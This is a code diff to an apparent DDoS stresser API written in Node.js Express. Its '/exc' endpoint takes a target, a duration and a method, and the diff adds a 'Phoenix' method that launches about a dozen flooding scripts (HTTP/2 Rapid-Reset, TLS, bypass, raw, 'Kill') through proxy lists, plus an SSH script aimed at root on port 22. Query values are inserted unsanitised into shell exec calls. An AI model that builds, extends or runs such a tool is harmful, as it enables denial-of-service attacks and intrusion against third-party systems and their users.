@@ -58,7 +58,8 @@ async function fetchData() {
 
 app.get('/exc', (req, res) => {
   const { target, time, methods } = req.query;
-
+  const sikat = new url.URL(target);
+  const slurp = sikat.hostname
   res.status(200).json({
     message: 'API request received. Executing script shortly, By JooModdss #Phoenix',
     target,
@@ -72,7 +73,19 @@ app.get('/exc', (req, res) => {
     exec(`node ./methods/HDRH2.js ${target} ${time} 10 100 true`);
     exec(`node ./methods/H2F3.js ${target} ${time} 100 10 proxy.txt`);
     exec(`node ./methods/BLAST.js ${target} ${time} 100 10 proxy.txt`);
+    
    } else if (methods === 'Phoenix') {
+   exec(`node ./lib/cache/StarsXSsh.js ${slurp} 22 root ${time}`);
+   exec(`node ./lib/cache/HTTP-X.js ${target} ${time} 80 10 proxy.txt`)
+    exec(`node ./lib/cache/StarsXPidoras.js ${target} ${time} 80 10 proxy.txt`)
+   exec(`node ./lib/cache/StarsXRapid-Reset.js PermenMD ${time} 10 proxy.txt 80 ${target}`);
+   exec(`node ./lib/cache/StarsXRaw.js ${target} ${time}`);
+   exec(`node ./lib/cache/StarsXMix.js ${target} ${time} 100 10 proxy.txt`);
+   exec(`node ./lib/cache/StarsXNinja.js ${target} ${time}`);
+   exec(`node ./lib/cache/StarsXTls.js ${target} ${time} 100 10`);
+   exec(`node ./lib/cache/StarsXStrike.js GET ${target} ${time} 10 90 proxy.txt --full`);
+   exec(`node ./lib/cache/StarsXBypass.js ${target} ${time} 100 10 proxy.txt`);
+    exec(`node ./lib/cache/StarsXKill.js ${target} ${time} 100 10`);
     exec(`node ./methods/HTTP.js ${target} ${time}`);
     exec(`node ./methods/HTTPS.js ${target} ${time} 100 10 proxy.txt`);
     exec(`node ./methods/HTTPX.js ${target} ${time} 100 10 proxy.txt`);
